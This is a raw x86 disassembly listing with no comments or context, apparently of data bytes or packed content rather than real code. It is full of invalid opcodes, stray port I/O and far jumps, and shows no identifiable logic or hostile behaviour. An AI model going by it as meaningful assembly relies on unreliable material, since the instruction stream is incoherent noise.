  41ad64:	mov    dh,0x44
  41ad66:	adc    BYTE PTR [esi+eiz*2+0xf194c3a],bl
  41ad6d:	test   DWORD PTR [eax],ebp
  41ad6f:	test   al,0x10
  41ad71:	stos   DWORD PTR es:[edi],eax
  41ad72:	xor    DWORD PTR [edx],esi
  41ad74:	daa    
  41ad75:	adc    al,0xbe
  41ad77:	ret    0xf5c9
  41ad7a:	xor    cl,0xa9
  41ad7d:	cmp    bh,BYTE PTR [ecx-0x75cb91f8]
  41ad83:	retf   
  41ad84:	(bad)  
  41ad85:	mov    ah,0x74
  41ad87:	pop    ebx
  41ad88:	in     eax,0xd4
  41ad8a:	sub    BYTE PTR [ecx+edx*2],bl
  41ad8d:	stos   BYTE PTR es:[edi],al
  41ad8e:	pop    esp
  41ad8f:	mov    edx,0xf79e8dc3
  41ad94:	dec    edx
  41ad95:	adc    DWORD PTR [edx],0x34f7e51c
  41ad9b:	test   DWORD PTR ds:0x32db83c7,ebp
  41ada1:	arpl   dx,dx
  41ada3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ada4:	add    al,0x18
  41ada6:	scas   eax,DWORD PTR es:[edi]
  41ada7:	aad    0x28
  41ada9:	fistp  QWORD PTR [edi]
  41adab:	mov    edx,0xa62ba330
  41adb0:	scas   al,BYTE PTR es:[edi]
  41adb1:	mov    ebp,0xf72ba380
  41adb6:	xchg   edx,eax
  41adb7:	sub    ch,BYTE PTR [esi]
  41adb9:	mov    ecx,0xc5720c0a
  41adbe:	lods   eax,DWORD PTR ds:[esi]
  41adbf:	out    0x8a,eax
  41adc1:	mov    dl,0xc3
  41adc3:	push   ebp
  41adc4:	pusha  
  41adc5:	add    DWORD PTR [ecx-0x76],eax
  41adc8:	rcr    dl,cl
  41adca:	xchg   ebx,eax
  41adcb:	pop    ecx
  41adcc:	ins    BYTE PTR es:[edi],dx
  41adcd:	aaa    
  41adce:	cmp    DWORD PTR [esi-0x7a],0x4f
  41add2:	or     ecx,eax
  41add4:	or     cl,al
  41add6:	sbb    al,0xd9
  41add8:	mov    al,ds:0x68b43860
  41addd:	add    eax,0xa5486f69
  41ade2:	outs   dx,BYTE PTR ds:[esi]
  41ade3:	fdivr  DWORD PTR [edx-0x7ab6a4f8]
  41ade9:	in     eax,0x95
  41adeb:	test   BYTE PTR [ebp-0x11043258],ch
  41adf1:	pushf  
  41adf2:	data16 loope 0x41ad91
  41adf5:	ins    BYTE PTR es:[di],dx
  41adf7:	outs   dx,BYTE PTR ds:[esi]
  41adf8:	shr    dl,0x85
  41adfb:	or     dh,0x66
  41adfe:	(bad)  
  41adff:	loope  0x41ae21
  41ae01:	mov    ds:0x5ad98f52,eax
  41ae06:	out    dx,eax
  41ae07:	lock mov cl,0x1f
  41ae0a:	test   eax,0x9e7b2a73
  41ae0f:	inc    eax
  41ae10:	push   edx
  41ae11:	adc    ah,ch
  41ae13:	mov    DWORD PTR ds:0x28109454,ecx
  41ae19:	mov    BYTE PTR [ebp-0x7dfe2bda],dl
  41ae1f:	and    DWORD PTR [ecx+0x21],edx
  41ae22:	adc    eax,0x4e91095
  41ae27:	inc    ebx
  41ae28:	fxch   st(2)
  41ae2a:	sbb    eax,0xffba8207
  41ae2f:	pop    ecx
  41ae30:	pop    ecx
  41ae31:	jge    0x41aea5
  41ae33:	fild   WORD PTR [edi]
  41ae35:	pop    ss
  41ae36:	push   esi
  41ae37:	mov    ds:0xbd5f66c4,ax
  41ae3d:	jmp    0x41aded
  41ae3f:	test   eax,0xbc081cb7
  41ae44:	and    DWORD PTR [eax],eax
  41ae46:	jo     0x41adf5
  41ae48:	repnz fild WORD PTR [ecx+edx*8-0x31]
  41ae4d:	cmc    
  41ae4e:	iret   
  41ae4f:	mov    ebp,0x187ff624
  41ae54:	in     al,0xf8
  41ae56:	xor    esi,ebx
  41ae58:	shl    DWORD PTR [ebp-0x424a8953],0x35
  41ae5f:	pushf  
  41ae60:	jp     0x41ae4c
  41ae62:	sbb    ebp,DWORD PTR [ebx-0x41]
  41ae65:	popa   
  41ae66:	loope  0x41ae4f
  41ae68:	or     BYTE PTR [eax+0x4b],0x14
  41ae6c:	js     0x41ae40
  41ae6e:	mov    esp,0x271ebbc0
  41ae73:	es (bad) 
  41ae75:	sbb    DWORD PTR [ebp-0x78598f36],eax
  41ae7b:	xchg   edi,eax
  41ae7c:	sbb    al,0x51
  41ae7e:	mov    ?,WORD PTR [eax]
  41ae80:	or     BYTE PTR [eax+0x76942256],ch
  41ae86:	in     al,0x7e
  41ae88:	mov    BYTE PTR [esi+0x42],dl
  41ae8b:	test   al,0x47
  41ae8d:	xchg   ebx,eax
  41ae8e:	imul   eax,DWORD PTR [ecx+eiz*4-0x36],0x3b329640
  41ae96:	in     eax,0x51
  41ae98:	loop   0x41af0b
  41ae9a:	mov    WORD PTR [esi-0x33cf492c],ss
  41aea0:	add    eax,0x28bc2857
  41aea5:	mov    ah,0x78
  41aea7:	xor    al,0xa
  41aea9:	in     eax,dx
  41aeaa:	add    BYTE PTR ds:0xd6202644,ah
  41aeb0:	call   0xea0b:0x54268d8
  41aeb7:	add    al,0x73
  41aeb9:	jmp    0xcf98:0x55ae1f00
  41aec0:	inc    edx
  41aec1:	xchg   esi,eax
  41aec2:	fidivr DWORD PTR [ecx]
  41aec4:	(bad)  
  41aec5:	or     BYTE PTR [ebp-0x7baf3bb6],cl
  41aecb:	adc    BYTE PTR [ecx],ah
  41aecd:	aam    0xc2
  41aecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aed0:	push   ecx
  41aed1:	add    al,0xde
  41aed3:	ror    DWORD PTR [esi+0x73],cl
  41aed6:	repnz loope 0x41ae69
  41aed9:	pop    ebp
  41aeda:	rcl    DWORD PTR [ebx+0x44cab048],1
  41aee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aee1:	dec    ecx
  41aee2:	dec    esp
  41aee3:	dec    eax
  41aee4:	sub    al,BYTE PTR fs:[edx+edi*4+0x6d189686]
  41aeec:	loop   0x41aee0
  41aeee:	inc    edi
  41aeef:	call   0x2b3f8957
  41aef4:	sub    edi,DWORD PTR [esi-0x73]
  41aef7:	jp     0x41af4d
  41aef9:	push   eax
  41aefa:	rcl    DWORD PTR [ecx],1
  41aefc:	fiadd  WORD PTR [edi]
  41aefe:	js     0x41af1f
  41af00:	adc    BYTE PTR [eax+0x6153552a],ch
  41af06:	scas   eax,DWORD PTR es:[edi]
  41af07:	sar    DWORD PTR [ebp+ebp*4+0x6d],1
  41af0b:	xor    BYTE PTR [ecx-0x7c],dh
  41af0e:	or     DWORD PTR [eax*4+0x3b4b55c8],ecx
  41af15:	sub    ch,BYTE PTR [edx-0x66d5ad2f]
  41af1b:	pop    ds
  41af1c:	xchg   ecx,eax
  41af1d:	test   BYTE PTR [esi+0x4a],al
  41af20:	test   esi,edx
  41af22:	mov    edx,0x4a29fa1c
  41af27:	ror    dl,1
  41af29:	jecxz  0x41aed7
  41af2b:	ret    
  41af2c:	mov    al,dl
  41af2e:	sub    ah,BYTE PTR [ecx]
  41af30:	push   edi
  41af31:	inc    edx
  41af32:	xor    edx,esp
  41af34:	adc    al,0x74
  41af36:	push   esp
  41af37:	(bad)  
  41af38:	rcl    DWORD PTR [edi-0x2d00fae7],1
  41af3e:	mov    ds:0x18086d9f,al
  41af43:	mov    ebp,0x644c3957
  41af48:	fwait
  41af49:	mov    ebx,eax
  41af4b:	mov    esi,0x62a57b0
  41af50:	scas   al,BYTE PTR es:[edi]
  41af51:	jb     0x41af54
  41af53:	and    ch,BYTE PTR [eax+0x7c]
  41af56:	mov    ecx,0x48f3a888
  41af5b:	loope  0x41af4d
  41af5d:	pop    ecx
  41af5e:	or     DWORD PTR [ebx+0xb],0x7e833f5c
  41af65:	and    esp,0xe72b2e39
  41af6b:	xor    DWORD PTR [edi+ebp*4+0x67],ebp
  41af6f:	call   0x68884dba
  41af74:	test   BYTE PTR [ecx-0x26],al
  41af77:	in     eax,0x6f
  41af79:	std    
  41af7a:	inc    esp
  41af7b:	enter  0x7c8f,0xa0
  41af7f:	inc    esi
  41af80:	fwait
  41af81:	pushf  
  41af82:	lds    ecx,FWORD PTR ds:0x86f89c7
  41af88:	ja     0x41af69
  41af8a:	mov    ds:0x67d6dfa9,eax
  41af8f:	outs   dx,BYTE PTR ds:[esi]
  41af90:	sub    al,0xe6
  41af92:	add    ebx,DWORD PTR [edi]
  41af94:	mov    ds,WORD PTR [eax-0x2c7f664]
  41af9a:	pop    esp
  41af9b:	(bad)  
  41af9c:	out    dx,al
  41af9d:	popw   ds
  41af9f:	out    dx,eax
  41afa0:	sbb    eax,0x5418f7d3
  41afa5:	shl    BYTE PTR [ebx-0x765668dd],cl
  41afab:	ret    0x4528
  41afae:	push   ebp
  41afaf:	xchg   DWORD PTR [edx+ebp*1],esp
  41afb2:	(bad)  
  41afb3:	mov    BYTE PTR [ecx],ah
  41afb5:	push   eax
  41afb6:	or     DWORD PTR [ecx+0x10dac4d7],eax
  41afbc:	mov    ch,BYTE PTR [esi]
  41afbe:	mov    bl,0x20
  41afc0:	mov    ds:0x2a114e70,al
  41afc5:	mov    eax,ds:0xef848711
  41afca:	aas    
  41afcb:	sub    ecx,DWORD PTR es:[edi-0x2c0f0612]
  41afd2:	(bad)  
  41afd3:	repz cld 
  41afd5:	lahf   
  41afd6:	out    0x9b,al
  41afd8:	(bad)  
  41afd9:	(bad)  
  41afda:	jmp    0xbc08:0x14b7b991
  41afe1:	popa   
  41afe2:	and    eax,eax
  41afe4:	fbld   TBYTE PTR [eax+0x265e0fda]
  41afea:	out    dx,al
  41afeb:	jg     0x41b005
  41afed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afee:	mov    edx,0xb76f398a
  41aff3:	stos   BYTE PTR es:[edi],al
  41aff4:	sub    ebp,DWORD PTR [ebx-0x17]
  41aff7:	in     al,0xd3
  41aff9:	(bad)  
  41affa:	scas   al,BYTE PTR es:[edi]
  41affb:	cld    
  41affc:	push   0xffffffe1
  41affe:	clc    
  41afff:	pop    ecx
  41b000:	adc    ebp,DWORD PTR [edx-0x1b2aad60]
  41b006:	inc    ebx
  41b007:	dec    ebx
  41b008:	outs   dx,DWORD PTR ds:[esi]
  41b009:	stos   DWORD PTR es:[edi],eax
  41b00a:	inc    ebp
  41b00b:	cmp    edi,DWORD PTR [ecx-0x62]
  41b00e:	aad    0xf0
  41b010:	jno    0x41b08e
  41b012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b013:	inc    eax
  41b014:	test   DWORD PTR [ecx],ebp
  41b016:	dec    edx
  41b017:	or     DWORD PTR [edx+0x41],ebx
  41b01a:	adc    al,bh
  41b01c:	inc    esp
  41b01d:	and    DWORD PTR [eax],edi
  41b01f:	in     eax,dx
  41b020:	push   ecx
  41b021:	mov    ds:0x84a553d2,eax
  41b026:	pop    eax
  41b027:	inc    edi
  41b028:	test   BYTE PTR [edx],ch
  41b02a:	les    ebx,FWORD PTR [eax]
  41b02c:	dec    ebp
  41b02d:	and    BYTE PTR [esi+eax*4-0x35c7e9a2],cl
  41b034:	cwde   
  41b035:	pop    edi
  41b036:	pop    ss
  41b037:	xchg   BYTE PTR [ecx-0x5f],al
  41b03a:	enter  0x4f32,0xe0
  41b03e:	adc    eax,0xff165c41
  41b043:	push   0x9121d020
  41b048:	sbb    DWORD PTR [eax+0x41],0x5a448618
  41b04f:	xchg   ebp,eax
  41b050:	sub    ebp,ebp
  41b052:	js     0x41b0b5
  41b054:	dec    ebp
  41b055:	dec    esi
  41b056:	xchg   ecx,eax
  41b057:	mov    edx,0x281fdcf3
  41b05c:	je     0x41b00e
  41b05e:	xor    DWORD PTR [ebx+0x5d],0x18
  41b062:	imul   edx,DWORD PTR [esi+0x50],0x5a
  41b066:	test   al,0x9
  41b068:	dec    eax
  41b069:	pop    esi
  41b06a:	test   bl,0x5f
  41b06d:	pop    esi
  41b06e:	fisub  DWORD PTR [esp+ecx*8]
  41b071:	xor    ebp,esi
  41b073:	test   al,0x6d
  41b075:	inc    eax
  41b076:	hlt    
  41b077:	ins    DWORD PTR es:[edi],dx
  41b078:	(bad)  
  41b079:	xchg   ebx,eax
  41b07a:	mov    WORD PTR [edx-0x7b831f57],gs
  41b080:	mov    ch,0x1
  41b082:	dec    edx
  41b083:	(bad)
  41b086:	pushf  
  41b087:	stos   DWORD PTR es:[edi],eax
  41b088:	push   ecx
  41b089:	pop    eax
  41b08a:	ret    
  41b08b:	icebp  
  41b08c:	int    0x2e
  41b08e:	pop    ss
  41b08f:	frstor ds:0x898ce266
  41b095:	and    BYTE PTR [edx],ah
  41b097:	xchg   esp,eax
  41b098:	or     al,BYTE PTR [esi+0x5]
  41b09b:	test   BYTE PTR [edx-0x7bd553b6],ch
  41b0a1:	stos   BYTE PTR es:[edi],al
  41b0a2:	dec    ecx
  41b0a3:	xchg   esi,eax
  41b0a4:	or     DWORD PTR [edi-0x2d616294],edx
  41b0aa:	xor    al,0x2b
  41b0ac:	and    DWORD PTR [esi-0x5c],ebx
  41b0af:	int3   
  41b0b0:	mov    edi,0x7f4b36cb
  41b0b5:	or     eax,0xa1a0802f
  41b0ba:	add    al,0x89
  41b0bc:	in     eax,dx
  41b0bd:	cdq    
  41b0be:	jge    0x41b07e
  41b0c0:	dec    esp
  41b0c1:	in     eax,0x6b
  41b0c3:	add    al,0x6d
  41b0c5:	xor    al,0x2a
  41b0c7:	shl    BYTE PTR [ebx+0x7283c0a5],1
  41b0cd:	sbb    dl,BYTE PTR [eax-0x467bb8d7]
  41b0d3:	xchg   ecx,eax
  41b0d4:	test   esi,esi
  41b0d6:	xlat   BYTE PTR ds:[ebx]
  41b0d7:	sbb    al,0xaf
  41b0d9:	sub    al,0x21
  41b0db:	test   BYTE PTR [esi+edx*4-0x8cee6ee],0xa3
  41b0e3:	out    0x47,eax
  41b0e5:	scas   eax,DWORD PTR es:[edi]
  41b0e6:	push   edi
  41b0e7:	and    eax,DWORD PTR [edx+0x6f]
  41b0ea:	les    ebx,FWORD PTR [edx]
  41b0ec:	pop    esp
  41b0ed:	or     eax,0xce597c4b
  41b0f2:	stos   DWORD PTR es:[edi],eax
  41b0f3:	or     cl,BYTE PTR [ebx+0x20fc5a1b]
  41b0f9:	ret    
  41b0fa:	div    DWORD PTR [ebx-0x36]
  41b0fd:	add    DWORD PTR [esi+edx*1],ecx
  41b100:	lods   al,BYTE PTR ds:[esi]
  41b101:	sub    eax,0x7b6417d7
  41b106:	add    DWORD PTR [ebx],edx
  41b108:	mov    ecx,0x102c7e5a
  41b10d:	sbb    ch,al
  41b10f:	out    0x72,al
  41b111:	xchg   DWORD PTR [edi-0x25318701],ecx
  41b117:	dec    DWORD PTR [edi-0x23]
  41b11a:	fwait
  41b11b:	pop    es
  41b11c:	(bad)  [esi+0x5f]
  41b11f:	cmc    
  41b120:	popf   
  41b121:	lahf   
  41b122:	cmc    
  41b123:	sbb    esi,esi
  41b125:	jo     0x41b0ad
  41b127:	cmp    edi,DWORD PTR [ebp+0x4f493df9]
  41b12d:	xchg   esi,eax
  41b12e:	lods   eax,DWORD PTR ds:[esi]
  41b12f:	sar    DWORD PTR [edx-0x6e],0x3c
  41b133:	adc    BYTE PTR ds:0x49b0b18c,0xe8
  41b13a:	sbb    BYTE PTR [edx],bl
  41b13c:	or     BYTE PTR [eax+ebp*1],al
  41b13f:	test   al,0x30
  41b141:	xchg   BYTE PTR [edx*4+0x1d090c26],dh
  41b148:	inc    edx
  41b149:	test   al,0xd0
  41b14b:	and    eax,0x9ddb549a
  41b150:	mov    ds:0x3a5548ab,al
  41b155:	add    al,0x1c
  41b157:	mov    edx,0x9bb754cb
  41b15c:	inc    esp
  41b15d:	popa   
  41b15e:	or     BYTE PTR [esi],cl
  41b160:	(bad)  
  41b161:	pusha  
  41b162:	sbb    edi,DWORD PTR [edi]
  41b164:	sub    BYTE PTR [ebx+eax*4+0x2d],0x4b
  41b169:	jbe    0x41b146
  41b16b:	adc    dh,BYTE PTR [esi-0x1610329b]
  41b171:	int    0x77
  41b173:	mov    esi,0xff7bd867
  41b178:	jle    0x41b125
  41b17a:	(bad)  
  41b17b:	clc    
  41b17c:	std    
  41b17d:	idiv   BYTE PTR [ecx-0x269dbfa9]
  41b183:	xchg   esi,eax
  41b184:	lea    esi,[ebx-0x8c42155]
  41b18a:	dec    esp
  41b18b:	jnp    0x41b17c
  41b18d:	jae    0x41b15d
  41b18f:	pop    esi
  41b190:	jmp    0x41b149
  41b192:	(bad)  
  41b193:	ja     0x41b212
  41b195:	xlat   BYTE PTR ds:[ebx]
  41b196:	ja     0x41b171
  41b198:	pop    es
  41b199:	clc    
  41b19a:	stos   BYTE PTR es:[edi],al
  41b19b:	jmp    0xb274:0xca360f34
  41b1a2:	dec    ebp
  41b1a3:	test   al,0x46
  41b1a5:	pushf  
  41b1a6:	mov    ecx,0xd1f1f02e
  41b1ab:	jge    0x41b209
  41b1ad:	sbb    edi,ebp
  41b1af:	and    DWORD PTR [edx-0x18],edi
  41b1b2:	jno    0x41b1a2
  41b1b4:	mov    esi,0xff1f0ced
  41b1b9:	jo     0x41b142
  41b1bb:	mov    ch,0x8e
  41b1bd:	cmp    eax,0x6b7cdc23
  41b1c2:	loopne 0x41b216
  41b1c4:	repz sub DWORD PTR [esi],eax
  41b1c7:	call   0xe0c1:0x295a09c
  41b1ce:	aad    0xa7
  41b1d0:	sub    DWORD PTR [edx+0x62],ecx
  41b1d3:	icebp  
  41b1d4:	(bad)  
  41b1d5:	loopne 0x41b21b
  41b1d7:	fmul   DWORD PTR [ebx-0x632284f3]
  41b1dd:	cmp    DWORD PTR [edx+0x17],ecx
  41b1e0:	sbb    eax,0x6a961103
  41b1e5:	dec    edi
  41b1e6:	stc    
  41b1e7:	adc    eax,0xff67949f
  41b1ec:	repz cmc 
  41b1ee:	scas   eax,DWORD PTR es:[edi]
  41b1ef:	cmp    edi,esp
  41b1f1:	sbb    BYTE PTR [edi+0x3f2dd2df],dl
  41b1f7:	hlt    
  41b1f8:	neg    DWORD PTR [edi+0x5a]
  41b1fb:	push   DWORD PTR [edi]
  41b1fd:	jecxz  0x41b203
  41b1ff:	mov    esi,0x85e00e68
  41b204:	xor    BYTE PTR [esi+0x7b],bh
  41b207:	adc    ebx,edi
  41b209:	mov    ebp,ecx
  41b20b:	(bad)  
  41b20c:	loope  0x41b1a3
  41b20e:	dec    ebx
  41b20f:	fwait
  41b210:	imul   ebx,DWORD PTR [edi],0xfffffffd
  41b213:	loopne 0x41b1db
  41b215:	pinsrw mm5,WORD PTR [eax],0x3f
  41b219:	pusha  
  41b21a:	dec    ebx
  41b21b:	mov    bl,0x54
  41b21d:	psrld  mm2,QWORD PTR [ecx+ebx*8]
  41b221:	int    0xcb
  41b223:	jmp    0x41b1d9
  41b225:	and    DWORD PTR [edi-0x7],0xffffffd4
  41b229:	call   0x16e5530d
  41b22e:	push   ebx
  41b22f:	dec    edi
  41b230:	xor    DWORD PTR [esi-0x77],edx
  41b233:	sbb    dh,al
  41b235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b236:	gs pop eax
  41b238:	xchg   ebp,eax
  41b239:	cmp    BYTE PTR [edi-0x30],ch
  41b23c:	cwde   
  41b23d:	retf   
  41b23e:	bound  bp,DWORD PTR [ecx-0x71d6be94]
  41b245:	ficom  DWORD PTR [ebp-0x2c]
  41b248:	scas   al,BYTE PTR es:[edi]
  41b249:	ret    0x8b5a
  41b24c:	push   0xffffff97
  41b24e:	jb     0x41b244
  41b250:	push   0x263bcd98
  41b255:	lods   eax,DWORD PTR ds:[esi]
  41b256:	inc    ecx
  41b257:	data16 sahf 
  41b259:	inc    edx
  41b25a:	push   0xffffff8c
  41b25c:	or     edx,DWORD PTR [ebp+edx*2+0x64]
  41b260:	call   0x39334791
  41b265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b266:	aam    0xd6
  41b268:	out    0x54,al
  41b26a:	add    al,BYTE PTR [esi]
  41b26c:	push   esp
  41b26d:	sub    DWORD PTR [ebp-0x1d3a1f40],esp
  41b273:	ins    DWORD PTR es:[edi],dx
  41b274:	inc    edi
  41b275:	pop    ecx
  41b276:	ins    DWORD PTR es:[edi],dx
  41b277:	jae    0x41b254
  41b279:	mov    al,ds:0xe3b393e6
  41b27e:	inc    esp
  41b27f:	out    0x28,eax
  41b281:	inc    esp
  41b282:	cwde   
  41b283:	jne    0x41b206
  41b285:	data16 jae 0x41b20f
  41b288:	arpl   WORD PTR [ecx+0x4bc098c1],sp
  41b28e:	inc    esi
  41b28f:	out    dx,eax
  41b290:	rcl    DWORD PTR [edi+esi*8+0x586eba73],0x73
  41b298:	sub    edi,ebp
  41b29a:	ja     0x41b27e
  41b29c:	jno    0x41b2f0
  41b29e:	push   eax
  41b29f:	cdq    
  41b2a0:	sbb    al,cl
  41b2a2:	mov    cl,0x1d
  41b2a4:	sbb    ch,BYTE PTR [esi]
  41b2a6:	int    0x37
  41b2a8:	push   eax
  41b2a9:	scas   al,BYTE PTR es:[edi]
  41b2aa:	jo     0x41b284
  41b2ac:	aaa    
  41b2ad:	sub    al,0x19
  41b2af:	dec    edi
  41b2b0:	and    DWORD PTR [ebx],ebp
  41b2b2:	xchg   esp,eax
  41b2b3:	dec    ax
  41b2b5:	in     eax,dx
  41b2b6:	xchg   esi,eax
  41b2b7:	test   al,0xec
  41b2b9:	nop
  41b2ba:	shr    BYTE PTR [ecx+eiz*2],cl
  41b2bd:	dec    esp
  41b2be:	leave  
  41b2bf:	(bad)  
  41b2c0:	mov    esp,0x3c871260
  41b2c5:	mov    esp,0x3d2ca731
  41b2ca:	mov    ds:0x6fe6d3ca,eax
  41b2cf:	push   esp
  41b2d0:	cli    
  41b2d1:	adc    eax,0x96d033c
  41b2d6:	dec    ebp
  41b2d7:	iret   
  41b2d8:	pusha  
  41b2d9:	mov    al,ds:0xa6e00591
  41b2de:	cwde   
  41b2df:	pop    esi
  41b2e0:	adc    eax,0xea48800c
  41b2e5:	jns    0x41b2cf
  41b2e7:	pop    es
  41b2e8:	jnp    0x41b318
  41b2ea:	push   esi
  41b2eb:	inc    ch
  41b2ed:	sub    cl,BYTE PTR [edi-0x6a]
  41b2f0:	(bad)  
  41b2f1:	ds add dl,bl
  41b2f4:	sbb    eax,0x3d0dfb88
  41b2f9:	stos   DWORD PTR es:[edi],eax
  41b2fa:	out    dx,eax
  41b2fb:	and    cl,0xf7
  41b2fe:	add    DWORD PTR [edi-0x45fa0570],edi
  41b304:	or     bl,dl
  41b306:	mov    ?,WORD PTR [eax]
  41b308:	jmp    0xf3492c9d
  41b30d:	cwde   
  41b30e:	cli    
  41b30f:	add    eax,0xe6337972
  41b314:	fadd   DWORD PTR [edx+0x24]
  41b317:	or     eax,0x85ce7912
  41b31c:	and    eax,DWORD PTR [edx+0x5d]
  41b31f:	pop    ebx
  41b320:	mov    dh,0xaf
  41b322:	in     eax,dx
  41b323:	mov    dl,0x51
  41b325:	inc    esp
  41b326:	outs   dx,BYTE PTR ds:[esi]
  41b327:	mov    ebp,0x6cd69971
  41b32c:	jae    0x41b352
  41b32e:	push   esp
  41b32f:	cmp    al,0xf5
  41b331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b332:	sub    ecx,DWORD PTR [esi+ecx*8-0x3d]
  41b336:	jmp    0x41b326
  41b338:	pop    esi
  41b339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b33a:	fs xchg ebp,eax
  41b33c:	cdq    
  41b33d:	pop    esp
  41b33e:	bound  esp,QWORD PTR [esi+0x2f]
  41b341:	jo     0x41b3b7
  41b343:	fnstenv [ebx-0x2]
  41b346:	shl    BYTE PTR [edx],cl
  41b348:	jnp    0x41b319
  41b34a:	or     bl,al
  41b34c:	ror    BYTE PTR ds:0x5d66deaf,0x3f
  41b353:	inc    ebp
  41b354:	gs xchg esp,eax
  41b356:	ret    0x9c1a
  41b359:	sub    DWORD PTR [ecx],esp
  41b35b:	es stc 
  41b35d:	sub    edx,DWORD PTR ss:[esi]
  41b360:	and    ecx,DWORD PTR [edx-0x30]
  41b363:	aam    0x2b
  41b365:	shr    BYTE PTR [ecx-0x39],cl
  41b368:	scas   al,BYTE PTR es:[edi]
  41b369:	into   
  41b36a:	cwde   
  41b36b:	imul   ecx,DWORD PTR [edx+0x55845a92],0x5b
  41b372:	xor    DWORD PTR [esi],ebx
  41b374:	sbb    cl,ah
  41b376:	retf   
  41b377:	ds ins DWORD PTR es:[edi],dx
  41b379:	iret   
  41b37a:	mov    edi,0x8febd4eb
  41b37f:	lahf   
  41b380:	(bad)  
  41b382:	les    edi,FWORD PTR [edi-0x1705430]
  41b388:	lock lods eax,DWORD PTR ds:[esi]
  41b38a:	daa    
  41b38b:	call   FWORD PTR [ebx-0x4c19fd90]
  41b391:	mov    edi,0x9edbf3e4
  41b396:	inc    edi
  41b397:	rol    esp,cl
  41b399:	jg     0x41b36c
  41b39b:	inc    ecx
  41b39c:	pushf  
  41b39d:	cmp    eax,0x8af6708b
  41b3a2:	mov    ecx,0x36a93bb2
  41b3a7:	out    0x93,eax
  41b3a9:	in     eax,0x8f
  41b3ab:	mov    esi,0x75b7eaff
  41b3b0:	inc    ecx
  41b3b1:	dec    BYTE PTR [esi-0x1aa533d3]
  41b3b7:	or     eax,0xbf596bb1
  41b3bc:	js     0x41b353
  41b3be:	(bad)  
  41b3bf:	ins    DWORD PTR es:[edi],dx
  41b3c0:	icebp  
  41b3c1:	lock loopne 0x41b443
  41b3c4:	daa    
  41b3c5:	xchg   esp,eax
  41b3c6:	adc    esp,DWORD PTR [esp+ebx*4-0x3d9716a0]
  41b3cd:	sbb    al,0x15
  41b3cf:	lds    edi,FWORD PTR [ebx]
  41b3d1:	sub    DWORD PTR [ecx],0xffffffd2
  41b3d4:	mov    esp,0xb89318fb
  41b3d9:	gs pop ecx
  41b3db:	cmp    BYTE PTR [esi],al
  41b3dd:	lds    ebx,FWORD PTR [eax-0x773948ab]
  41b3e3:	and    eax,0xec48f12a
  41b3e8:	adc    al,BYTE PTR [edx-0x61]
  41b3eb:	fwait
  41b3ec:	inc    esi
  41b3ed:	add    al,0x43
  41b3ef:	fild   DWORD PTR [ebp+0x62]
  41b3f2:	je     0x41b438
  41b3f4:	xlat   BYTE PTR ds:[ebx]
  41b3f5:	push   edx
  41b3f6:	push   cs
  41b3f7:	sub    al,0x23
  41b3f9:	out    dx,eax
  41b3fa:	adc    BYTE PTR [ebx-0x5853571b],bl
  41b400:	jbe    0x41b42b
  41b402:	add    al,0x34
  41b404:	push   0x41
  41b406:	out    0x78,eax
  41b408:	mov    cl,0x14
  41b40a:	scas   al,BYTE PTR es:[edi]
  41b40b:	dec    esp
  41b40c:	cli    
  41b40d:	cli    
  41b40e:	add    al,BYTE PTR [ebx+0x7f]
  41b411:	cwde   
  41b412:	popa   
  41b413:	xor    ecx,esp
  41b415:	out    dx,al
  41b416:	jp     0x41b423
  41b418:	xor    DWORD PTR [esi-0x73a45473],eax
  41b41e:	daa    
  41b41f:	fwait
  41b420:	pushf  
  41b421:	test   al,0x36
  41b423:	sub    DWORD PTR [ebx-0x5a051da1],ebp
  41b429:	pop    edi
  41b42a:	loope  0x41b4a4
  41b42c:	stc    
  41b42d:	dec    ecx
  41b42e:	into   
  41b42f:	xchg   esp,eax
  41b430:	sub    eax,0x3af0e2ab
  41b435:	(bad)  
  41b436:	xor    esp,DWORD PTR [eax+0x6ed44bb6]
  41b43c:	test   BYTE PTR [eax+0x4d],cl
  41b43f:	mov    BYTE PTR [esi+0x57558292],bl
  41b445:	mov    al,0x5a
  41b447:	adc    al,0x8c
  41b449:	int3   
  41b44a:	or     al,BYTE PTR [ebp+0x6590a159]
  41b450:	push   0xffffffb7
  41b452:	test   BYTE PTR [ebp+0x920c30a],dl
  41b458:	xchg   edi,eax
  41b459:	dec    edx
  41b45a:	ror    ecx,0xe1
  41b45d:	nop
  41b45e:	scas   eax,DWORD PTR es:[edi]
  41b45f:	sbb    ebp,ecx
  41b461:	js     0x41b45c
  41b463:	xchg   edx,eax
  41b464:	jecxz  0x41b430
  41b466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b467:	dec    ebp
  41b468:	ror    al,1
  41b46a:	mov    dl,BYTE PTR [ebx]
  41b46c:	push   esi
  41b46d:	ins    BYTE PTR es:[edi],dx
  41b46e:	xor    bh,BYTE PTR [ebx+edx*4+0x13]
  41b472:	not    DWORD PTR [esi+edx*4-0x34]
  41b476:	loop   0x41b49d
  41b478:	xchg   edx,eax
  41b479:	add    BYTE PTR [ebx+ebp*2],bh
  41b47c:	xchg   edx,eax
  41b47d:	shl    BYTE PTR [edi+0x31b2abcb],1
  41b483:	mov    al,ds:0x48b012bd
  41b488:	push   ds
  41b489:	or     al,0x42
  41b48b:	stos   BYTE PTR es:[edi],al
  41b48c:	out    0xf7,eax
  41b48e:	shl    BYTE PTR [esi-0x7a],0xf3
  41b492:	mov    bl,0x4a
  41b494:	clc    
  41b495:	ds jne 0x41b44f
  41b498:	daa    
  41b499:	cmp    al,0x89
  41b49b:	sub    al,0xaa
  41b49d:	push   ds
  41b49e:	xchg   edx,eax
  41b49f:	ficomp WORD PTR [edx+ebp*8-0xb8ad903]
  41b4a6:	rol    DWORD PTR [edx+eiz*8-0x54],1
  41b4aa:	and    ebp,esp
  41b4ac:	xor    eax,0xda41ace8
  41b4b1:	cs test ecx,edi
  41b4b4:	stos   BYTE PTR es:[edi],al
  41b4b5:	or     esp,DWORD PTR ds:0xb69c861
  41b4bb:	dec    ecx
  41b4bc:	pop    esi
  41b4bd:	pushf  
  41b4be:	ds arpl bx,cx
